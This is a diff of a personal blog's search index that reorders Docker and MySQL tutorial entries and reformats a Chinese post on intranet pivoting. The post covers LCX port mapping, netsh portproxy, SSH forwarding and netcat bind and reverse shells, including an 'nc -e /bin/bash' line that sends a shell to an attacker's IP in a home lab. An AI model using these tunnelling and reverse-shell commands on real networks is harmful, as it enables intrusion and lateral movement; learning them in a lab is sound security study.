@@ -1,7 +1,35 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>linux安装MySQL[用glibc的方法].md</title>
+    <title>docker基础</title>
+    <url>/2021/06/09/docker%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h1 id="Docker的常用命令"><a href="#Docker的常用命令" class="headerlink" title="Docker的常用命令"></a>Docker的常用命令</h1><p><strong>帮助命令</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker version	    #显示docker的版本信息 </span><br><span class="line">docker info         #显示docker的系统信息</span><br><span class="line">docker 命令 --help  #帮助命令</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>Docker 的官网文档命令<br><strong>镜像命令</strong><br>docker images 查看所有本地的主机上的镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@OpenWrt:~# docker images</span><br><span class="line">REPOSITORY                  TAG       IMAGE ID       CREATED       SIZE</span><br><span class="line">oldiy/music-player-docker   latest    f060773d86e0   2 years ago   81.7MB</span><br><span class="line"></span><br><span class="line">#  解释</span><br><span class="line">REPOSITORY  镜像的仓库源</span><br><span class="line">TAG         镜像的标签</span><br><span class="line">IMAGE ID    镜像的ID</span><br><span class="line">CREATED     镜像的创建时间</span><br><span class="line">SIZE        镜像大小</span><br></pre></td></tr></table></figure>
+<p>docker search   搜索镜像 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@OpenWrt:~# docker search mysql</span><br><span class="line">NAME                              DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql                             MySQL is a widely used, open-source relation…   10607     [OK]</span><br><span class="line">mariadb                           MariaDB Server is a high performing open sou…   3977      [OK]</span><br><span class="line">#可选项,通过收藏数来过滤</span><br><span class="line">root@OpenWrt:~# docker search mysql --filter=stars=1000</span><br><span class="line">NAME      DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql     MySQL is a widely used, open-source relation…   10607     [OK]</span><br><span class="line">mariadb   MariaDB Server is a high performing open sou…   3977      [OK]</span><br><span class="line">#列出收藏数大于1000的镜像</span><br></pre></td></tr></table></figure>
+<p>docker pulll 拉取镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 不加任何参数,默认拉取最新</span><br><span class="line">root@OpenWrt:~# docker pull hello-world</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/hello-world</span><br><span class="line">b8dfde127a29: Pull complete</span><br><span class="line">Digest: sha256:308866a43596e83578c7dfa15e27a73011bdd402185a84c5cd7f32a88b501a24</span><br><span class="line">Status: Downloaded newer image for hello-world:latest</span><br><span class="line">docker.io/library/hello-world:latest</span><br><span class="line"># 指定版本下载,,,,拉取mysql的5.6版本</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@OpenWrt:~# docker pull mysql:5.6</span><br><span class="line">5.6: Pulling from library/mysql</span><br><span class="line">a4feded82f54: Pull complete</span><br><span class="line">c1d0e80dd947: Pull complete</span><br><span class="line">a3eb306f0583: Pull complete</span><br><span class="line">9fafb9660ba0: Pull complete</span><br><span class="line">64aef7d42843: Pull complete</span><br><span class="line">488408f75e55: Pull complete</span><br><span class="line">5c154cf95ff0: Pull complete</span><br><span class="line">ae9d479e9699: Pull complete</span><br><span class="line">89e036f05e2f: Pull complete</span><br><span class="line">681eef5c7bd9: Pull complete</span><br><span class="line">1604d620cec0: Pull complete</span><br><span class="line">Digest: sha256:f3515b6a6502d872d5a37db78e4d225c0fcbf8da65d1faf8ce4609c92e2cbaf0</span><br><span class="line">Status: Downloaded newer image for mysql:5.6</span><br><span class="line">docker.io/library/mysql:5.6</span><br></pre></td></tr></table></figure>
+<p>删除镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@OpenWrt:~# docker rmi -f 镜像id        #删除指定镜像</span><br><span class="line">root@OpenWrt:~# docker rmi -f $(docker images -qa)  #删除所有镜像</span><br></pre></td></tr></table></figure>
+<p><strong>容器命令</strong><br><em>基本理解：</em> 镜像运行起来的时候叫做容器，第一次运行镜像的时候要指定参数，有容器没有镜像也能运行。<br/><br>说明：有镜像才能创建容器，先下载一个centos练手<br> <code>root@OpenWrt:~# docker pull centos</code><br> 新建容器并启动<br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br><span class="line"> # 参数说明</span><br><span class="line"> --name     #容器名字</span><br><span class="line"> -d         #后台运行</span><br><span class="line"> -i         #交互式操作</span><br><span class="line"> -t         #终端</span><br><span class="line"> -P         #指定容器端口   8080:8080(主机端口:容器端口)</span><br><span class="line"></span><br><span class="line"> # 启动并进入容器</span><br><span class="line"> root@OpenWrt:~# docker run -it centos /bin/bash</span><br><span class="line"> #查看容器</span><br><span class="line"> root@OpenWrt:~# docker ps      </span><br><span class="line"> #查看正在运行的容器</span><br><span class="line">-a      显示所有容器</span><br><span class="line">-n=?    显示最近创建的容器</span><br><span class="line">-q      仅显示容器的id号</span><br></pre></td></tr></table></figure><br>退出容器</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit        #直接停止并退出</span><br><span class="line">ctrl+P+Q    #容器不停止退出</span><br></pre></td></tr></table></figure>
+<p>删除容器</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm 容器id    #不能删除正在运行的容器，加参数-f,强制删除</span><br></pre></td></tr></table></figure>
+<p>启动和停止容器的操作<br/><br><code>docker start 容器id</code><br/><br><code>docker stop 容器id</code><br/><br><code>docker restart 容器id</code><br/><br><code>docker kill 容器id</code>#暴力删除容器<br><strong>常用的其他命令</strong></p>
+]]></content>
+      <categories>
+        <category>Docker</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux安装MySQL</title>
     <url>/2021/06/09/linux%E5%AE%89%E8%A3%85MySQL-%E7%94%A8glibc%E7%9A%84%E6%96%B9%E6%B3%95/</url>
     <content><![CDATA[<p>注：本次安装参照B站up主“bili逍遥bili”，采用glibc包安装。<br>所需工具：Redhat Linux（虚拟机），MobaXterm（终端工具），MySQL-5.6.44-1.el7.x86_64.rpm-bundle.tar（官网下载）。<br><a href="https://cdn.mysql.com/archives/mysql-5.6/mysql-5.6.44-linux-glibc2.12-x86_64.tar.gz">下载地址</a></p>
 <h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><span id="more"></span>
@@ -39,45 +67,16 @@
       </tags>
   </entry>
   <entry>
-    <title>docker基础</title>
-    <url>/2021/06/09/docker%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<h1 id="Docker的常用命令"><a href="#Docker的常用命令" class="headerlink" title="Docker的常用命令"></a>Docker的常用命令</h1><p><strong>帮助命令</strong>  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker version	    #显示docker的版本信息 </span><br><span class="line">docker info         #显示docker的系统信息</span><br><span class="line">docker 命令 --help  #帮助命令</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<p>Docker 的官网文档命令<br><strong>镜像命令</strong><br>docker images 查看所有本地的主机上的镜像</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@OpenWrt:~# docker images</span><br><span class="line">REPOSITORY                  TAG       IMAGE ID       CREATED       SIZE</span><br><span class="line">oldiy/music-player-docker   latest    f060773d86e0   2 years ago   81.7MB</span><br><span class="line"></span><br><span class="line">#  解释</span><br><span class="line">REPOSITORY  镜像的仓库源</span><br><span class="line">TAG         镜像的标签</span><br><span class="line">IMAGE ID    镜像的ID</span><br><span class="line">CREATED     镜像的创建时间</span><br><span class="line">SIZE        镜像大小</span><br></pre></td></tr></table></figure>
-<p>docker search   搜索镜像 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@OpenWrt:~# docker search mysql</span><br><span class="line">NAME                              DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql                             MySQL is a widely used, open-source relation…   10607     [OK]</span><br><span class="line">mariadb                           MariaDB Server is a high performing open sou…   3977      [OK]</span><br><span class="line">#可选项,通过收藏数来过滤</span><br><span class="line">root@OpenWrt:~# docker search mysql --filter=stars=1000</span><br><span class="line">NAME      DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql     MySQL is a widely used, open-source relation…   10607     [OK]</span><br><span class="line">mariadb   MariaDB Server is a high performing open sou…   3977      [OK]</span><br><span class="line">#列出收藏数大于1000的镜像</span><br></pre></td></tr></table></figure>
-<p>docker pulll 拉取镜像</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 不加任何参数,默认拉取最新</span><br><span class="line">root@OpenWrt:~# docker pull hello-world</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/hello-world</span><br><span class="line">b8dfde127a29: Pull complete</span><br><span class="line">Digest: sha256:308866a43596e83578c7dfa15e27a73011bdd402185a84c5cd7f32a88b501a24</span><br><span class="line">Status: Downloaded newer image for hello-world:latest</span><br><span class="line">docker.io/library/hello-world:latest</span><br><span class="line"># 指定版本下载,,,,拉取mysql的5.6版本</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@OpenWrt:~# docker pull mysql:5.6</span><br><span class="line">5.6: Pulling from library/mysql</span><br><span class="line">a4feded82f54: Pull complete</span><br><span class="line">c1d0e80dd947: Pull complete</span><br><span class="line">a3eb306f0583: Pull complete</span><br><span class="line">9fafb9660ba0: Pull complete</span><br><span class="line">64aef7d42843: Pull complete</span><br><span class="line">488408f75e55: Pull complete</span><br><span class="line">5c154cf95ff0: Pull complete</span><br><span class="line">ae9d479e9699: Pull complete</span><br><span class="line">89e036f05e2f: Pull complete</span><br><span class="line">681eef5c7bd9: Pull complete</span><br><span class="line">1604d620cec0: Pull complete</span><br><span class="line">Digest: sha256:f3515b6a6502d872d5a37db78e4d225c0fcbf8da65d1faf8ce4609c92e2cbaf0</span><br><span class="line">Status: Downloaded newer image for mysql:5.6</span><br><span class="line">docker.io/library/mysql:5.6</span><br></pre></td></tr></table></figure>
-<p>删除镜像</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@OpenWrt:~# docker rmi -f 镜像id        #删除指定镜像</span><br><span class="line">root@OpenWrt:~# docker rmi -f $(docker images -qa)  #删除所有镜像</span><br></pre></td></tr></table></figure>
-<p><strong>容器命令</strong><br><em>基本理解：</em> 镜像运行起来的时候叫做容器，第一次运行镜像的时候要指定参数，有容器没有镜像也能运行。<br/><br>说明：有镜像才能创建容器，先下载一个centos练手<br> <code>root@OpenWrt:~# docker pull centos</code><br> 新建容器并启动<br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br><span class="line"> # 参数说明</span><br><span class="line"> --name     #容器名字</span><br><span class="line"> -d         #后台运行</span><br><span class="line"> -i         #交互式操作</span><br><span class="line"> -t         #终端</span><br><span class="line"> -P         #指定容器端口   8080:8080(主机端口:容器端口)</span><br><span class="line"></span><br><span class="line"> # 启动并进入容器</span><br><span class="line"> root@OpenWrt:~# docker run -it centos /bin/bash</span><br><span class="line"> #查看容器</span><br><span class="line"> root@OpenWrt:~# docker ps      </span><br><span class="line"> #查看正在运行的容器</span><br><span class="line">-a      显示所有容器</span><br><span class="line">-n=?    显示最近创建的容器</span><br><span class="line">-q      仅显示容器的id号</span><br></pre></td></tr></table></figure><br>退出容器</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit        #直接停止并退出</span><br><span class="line">ctrl+P+Q    #容器不停止退出</span><br></pre></td></tr></table></figure>
-<p>删除容器</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm 容器id    #不能删除正在运行的容器，加参数-f,强制删除</span><br></pre></td></tr></table></figure>
-<p>启动和停止容器的操作<br/><br><code>docker start 容器id</code><br/><br><code>docker stop 容器id</code><br/><br><code>docker restart 容器id</code><br/><br><code>docker kill 容器id</code>#暴力删除容器<br><strong>常用的其他命令</strong></p>
-]]></content>
-      <categories>
-        <category>Docker</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-        <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>内网渗透.md</title>
-    <url>/2021/06/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
+    <title>内网渗透</title>
+    <url>/2021/06/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
     <content><![CDATA[<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p><strong>介绍：</strong>  攻击者通过边界主机进入内网，往往会利用它当跳板进行横向渗透，但现在的内部网络大多部署了很多安全设备，网络结构错综复杂，对于某些系统的访问会受到各种阻挠，这就需要借助代理去突破这些限制，因此面对不同的网络环境对于代理的选择及使用显得格外重要。<br><strong>情景介绍：</strong> 我的本地机子网段为10开头的看成公网，电脑中装有虚拟机网段为192网段看成内网</p>
 <span id="more"></span>
 <h2 id="端口转发和端口映射"><a href="#端口转发和端口映射" class="headerlink" title="端口转发和端口映射"></a>端口转发和端口映射</h2><p>&ensp;&ensp;端口转发，有时被称为做隧道，是安全壳（SSH）为网络安全通信使用的一种方法。简单来说，端口转发就是将一个端口收到的流量转发到另一个端口。端口映射是NAT的一种，功能是把在公网的地址转成私有地址。简单来说，端口映射就是将一个端口映射到另一个端口供他人使用。</p>
 <ol>
-<li><p>LCX工具<br> &ensp;&ensp;LCX是一款端口转发工具，分为Windows版和Linux版，Linux版本为PortMap。<br> 命令：</p>
- <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\常用文件\工具\网络工具\内网渗透\lcx.exe -&lt;listen|tran|slave&gt; &lt;option&gt; [-log logfile]</span><br><span class="line">[option:]</span><br><span class="line">端口转发</span><br><span class="line">-listen &lt;监听slave请求的端口&gt; &lt;等待链接的端口&gt;     #在外网电脑上执行</span><br><span class="line">-slave &lt;外网IP&gt; &lt;监听端口&gt; &lt;目标IP&gt;&gt; &lt;目标端口&gt;    #在外网电脑上执行</span><br><span class="line">端口映射</span><br><span class="line">-tran   &lt;等待链接的端口&gt; &lt;目标IP&gt; &lt;目标端口&gt;</span><br></pre></td></tr></table></figure>
-<p> &ensp;&ensp;推荐使用端口映射命令，端口转发命令需要在内网主机和外网主机都要执行，并且不稳定，我没有实验成功。端口映射只要在外网主机执行，<br> 实操<br> &ensp;&ensp;端口映射:在外网主机输入<code>lcx.exe -tran 2222 192.168.200.40 3389 </code>，把192网段的主机的3389端口映射到本机的2222端口，访问2222端口相当于访问192网段的3389端口<br> <img src="https://raw.githubusercontent.com/myzyzy/my-log/image/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Fimage/%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84.png" alt="端口映射"><br> &ensp;&ensp;端口转发：在内网主机输入命令<code>lcx.exe -slave 10.1.38.70 3333 192.168.200.40 3389 </code>,在外网主机执行命令<code>lcx.exe -listen 3333 2222 </code> 把 内网主机转发的3333端口的流量转到2222端口<br> <img src="https://raw.githubusercontent.com/myzyzy/my-log/image/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Fimage/lcx%E5%86%85%E7%BD%91.PNG" alt="端口转发内网"><br> <img src="https://raw.githubusercontent.com/myzyzy/my-log/image/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Fimage/%E5%A4%96%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.png" alt="端口转发外网">  </p>
-</li>
-<li><p>windows自带命令<br><a href="https://zhuanlan.zhihu.com/p/266473873">参考博客</a></p>
+<li>LCX工具<br>&ensp;&ensp;LCX是一款端口转发工具，分为Windows版和Linux版，Linux版本为PortMap。<br>命令：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\常用文件\工具\网络工具\内网渗透\lcx.exe -&lt;listen|tran|slave&gt; &lt;option&gt; [-log logfile]</span><br><span class="line">[option:]</span><br><span class="line">端口转发</span><br><span class="line">-listen &lt;监听slave请求的端口&gt; &lt;等待链接的端口&gt;     #在外网电脑上执行</span><br><span class="line">-slave &lt;外网IP&gt; &lt;监听端口&gt; &lt;目标IP&gt;&gt; &lt;目标端口&gt;    #在外网电脑上执行</span><br><span class="line">端口映射</span><br><span class="line">-tran   &lt;等待链接的端口&gt; &lt;目标IP&gt; &lt;目标端口&gt;</span><br></pre></td></tr></table></figure>
+&ensp;&ensp;推荐使用端口映射命令，端口转发命令需要在内网主机和外网主机都要执行，并且不稳定，我没有实验成功。端口映射只要在外网主机执行，<br>实操<br>&ensp;&ensp;端口映射:在外网主机输入<code>lcx.exe -tran 2222 192.168.200.40 3389 </code>，把192网段的主机的3389端口映射到本机的2222端口，访问2222端口相当于访问192网段的3389端口<br><img src="https://raw.githubusercontent.com/myzyzy/material/image/pacture/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84.png" alt="端口映射"><br>&ensp;&ensp;端口转发：在内网主机输入命令<code>lcx.exe -slave 10.1.38.70 3333 192.168.200.40 3389 </code>,在外网主机执行命令<code>lcx.exe -listen 3333 2222 </code> 把 内网主机转发的3333端口的流量转到2222端口<br><img src="https://raw.githubusercontent.com/myzyzy/material/image/pacture/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/lcx%E5%86%85%E7%BD%91.PNG" alt="端口转发内网"><br><img src="https://raw.githubusercontent.com/myzyzy/material/image/pacture/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%A4%96%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.png" alt="端口转发外网">  </li>
+<li>windows自带命令<br><a href="https://zhuanlan.zhihu.com/p/266473873">参考博客</a></li>
+</ol>
 <p>Windows 从 Windows 2000 开始就提供了最基本的端口转发功能，是基于 Windows 的<code>IP Helper</code>服务的，不仅可以提供端口转发功能，还可以通过将 IPv4 和 IPv6 的不同地址的数据进行转发，但是只可以转发 TCP 协议，暂不支持 UDP 协议，使用<code>netsh interface portproxy</code>命令即可开启。<br><strong>命令帮助</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Windows\system32&gt; netsh interface portproxy</span><br><span class="line">下列指令有效:</span><br><span class="line">此上下文中的命令:</span><br><span class="line">?              - 显示命令列表。</span><br><span class="line">add            - 在一个表格中添加一个配置项。</span><br><span class="line">delete         - 从一个表格中删除一个配置项。</span><br><span class="line">dump           - 显示一个配置脚本。</span><br><span class="line">help           - 显示命令列表。</span><br><span class="line">reset          - 重置端口代理配置状态。</span><br><span class="line">set            - 设置配置信息。</span><br><span class="line">show           - 显示信息。</span><br></pre></td></tr></table></figure>
 <p>查看所有的端口转发规则<code>netsh interface portproxy show all</code><br><strong>添加规则帮助</strong></p>
@@ -85,8 +84,6 @@
 <p>添加规则<br><code>netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=3389 connectaddress=&lt;目标IP&gt; connectport=3389</code><br>把目标IP的3389端口转发到本机<br><strong>delete命令</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete v4tov4  - 删除通过 IPv4 的 IPv4 和代理连接到的侦听项目。</span><br><span class="line">delete v4tov6  - 删除通过 IPv6 的 IPv4 和代理连接到的侦听项目。</span><br><span class="line">delete v6tov4  - 删除通过 IPv4 的 IPv6 和代理连接到的侦听项目。</span><br><span class="line">delete v6tov6  - 删除通过 IPv6 的 IPv6 和代理连接到的侦听项目。</span><br><span class="line">​</span><br><span class="line">用法: delete v4tov4 [listenport=]&lt;integer&gt;|&lt;servicename&gt;</span><br><span class="line">            [[listenaddress=]&lt;IPv4 address&gt;|&lt;hostname&gt;]</span><br><span class="line">            [[protocol=]tcp]</span><br><span class="line">​</span><br><span class="line">参数:</span><br><span class="line">​</span><br><span class="line">        标记             值</span><br><span class="line">        listenport     - 要侦听的 IPv4 端口。</span><br><span class="line">        listenport     - 要侦听的 IPv4 地址。</span><br><span class="line">        protocol       - 要使用的协议。当前仅支持 TCP。</span><br></pre></td></tr></table></figure>
 <p><strong>删除规则</strong><br><code>PS C:\Windows\system32&gt; netsh interface portproxy delete v4tov4 listenaddress=127.0.0.1 listenport=3389</code></p>
-</li>
-</ol>
 <h2 id="使用SSH端口转发"><a href="#使用SSH端口转发" class="headerlink" title="使用SSH端口转发"></a>使用SSH端口转发</h2><ol>
 <li>本地转发<br>&ensp;&ensp;设攻击者已经拿下了公网主机，并且通过主机A获取到了内网主机IP和端口信息，但是攻击者从攻击机无法直接访问内网，公网主机安装了SSH服务端，这时攻击者便可通过SSH协议连接到公网主机，再通过公网主机做跳板，连接内网主机。命令<code>ssh -L &lt;本机IP&gt;:&lt;本地端口&gt;:&lt;目的IP&gt;:&lt;目的IP端口&gt; -fN &lt;跳板主机地址&gt;</code>，命令在攻击机上执行。</li>
 <li>动态转发<br>&ensp;&ensp;动态转发指的是，本机与 SSH 服务器之间创建了一个加密连接，然后本机内部针对某个端口的通信，都通过这个加密连接转发。它的一个使用场景就是，访问所有外部网站，都通过 SSH 转发。<br>动态转发需要把本地端口绑定到 SSH 服务器。至于 SSH 服务器要去访问哪一个网站，完全是动态的，取决于原始通信，所以叫做动态转发。<br><code>ssh -D &lt;本地端口&gt; -CfNg &lt;ssh服务器地址&gt; </code><br>这种转发采用了 SOCKS5 协议，可以在客户端配置代理通过shh服务器访问服务。  </li>
@@ -97,17 +94,17 @@
 </ol>
 <ul>
 <li>实操</li>
-<li><em>目标机</em>*<br><img src="https://raw.githubusercontent.com/myzyzy/my-log/image/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Fimage/%E6%AD%A3%E5%90%91%E7%9B%AE%E6%A0%87nc.PNG" alt="正向目标nc">  </li>
-<li><em>攻击机</em>*<br><img src="https://raw.githubusercontent.com/myzyzy/my-log/image/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Fimage/%E6%AD%A3%E5%90%91%E6%94%BB%E5%87%BBnc.PNG" alt="正向攻击nc">  </li>
+<li><em>目标机</em>*<br><img src="https://raw.githubusercontent.com/myzyzy/material/image/pacture/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%AD%A3%E5%90%91%E7%9B%AE%E6%A0%87nc.PNG" alt="正向目标nc">  </li>
+<li><em>攻击机</em>*<br><img src="https://raw.githubusercontent.com/myzyzy/material/image/pacture/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%AD%A3%E5%90%91%E6%94%BB%E5%87%BBnc.PNG" alt="正向攻击nc">  </li>
 </ul>
 <ol>
 <li>反向shell<br>&ensp;&ensp;当目标机可访问外网时，可先在攻击机监听某一端口，然后从目标机连接此端口反向反弹Shell。在攻击机上输入<code>nc -lvvp &lt;端口&gt;</code>(监听某个端口)，在目标机上输入<code>nc -e /bin/bash &lt;攻击机IP&gt; &lt;攻击机开放的端口&gt;</code>，我感觉反向shell类似于钓鱼。</li>
 </ol>
 <ul>
 <li>实操</li>
-<li><em>攻击机</em>*<br><img src="https://raw.githubusercontent.com/myzyzy/my-log/image/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Fimage/%E5%8F%8D%E5%90%91shell%E6%94%BB%E5%87%BBnc.PNG" alt="反向shell攻击nc">  </li>
-<li><em>目标机</em>*<br><img src="https://raw.githubusercontent.com/myzyzy/my-log/image/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Fimage/%E5%8F%8D%E5%90%91shell%E7%9B%AE%E6%A0%87nc.PNG" alt="反向shell目标nc">  </li>
-<li><em>攻击机</em>*<br>之后弹出<br><img src="https://raw.githubusercontent.com/myzyzy/my-log/image/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Fimage/%E5%8F%8D%E5%90%91shell%E6%94%BB%E5%87%BBnc%E8%BF%90%E8%A1%8C%E5%90%8E.PNG" alt="反向shell攻击nc运行后"></li>
+<li><em>攻击机</em>*<br><img src="https://raw.githubusercontent.com/myzyzy/material/image/pacture/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%8F%8D%E5%90%91shell%E6%94%BB%E5%87%BBnc.PNG" alt="反向shell攻击nc">  </li>
+<li><em>目标机</em>*<br><img src="https://raw.githubusercontent.com/myzyzy/material/image/pacture/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%8F%8D%E5%90%91shell%E7%9B%AE%E6%A0%87nc.PNG" alt="反向shell目标nc">  </li>
+<li><em>攻击机</em>*<br>之后弹出<br><img src="https://raw.githubusercontent.com/myzyzy/material/image/pacture/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%8F%8D%E5%90%91shell%E6%94%BB%E5%87%BBnc%E8%BF%90%E8%A1%8C%E5%90%8E.PNG" alt="反向shell攻击nc运行后"></li>
 </ul>
 ]]></content>
       <categories>
